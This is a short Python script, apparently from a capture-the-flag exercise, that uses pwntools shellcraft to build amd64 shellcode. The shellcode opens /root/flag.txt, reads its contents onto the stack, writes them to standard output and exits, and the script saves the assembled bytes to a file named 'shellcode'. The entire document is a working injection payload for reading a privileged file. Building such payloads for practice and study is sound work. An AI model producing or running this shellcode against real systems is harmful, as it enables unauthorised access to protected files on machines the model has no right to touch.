from pwn import *

context.arch = 'amd64'
sc = shellcraft.open('/root/flag.txt',0)
sc += shellcraft.read('rax', 'rsp', 0x100)
sc += shellcraft.write(1, 'rsp', 0x100)
sc += shellcraft.write(1, "test", len("test"))
sc += shellcraft.exit()
e = ELF.from_assembly(sc, vma=0x400000)
open("shellcode", "wb").write(e.get_data())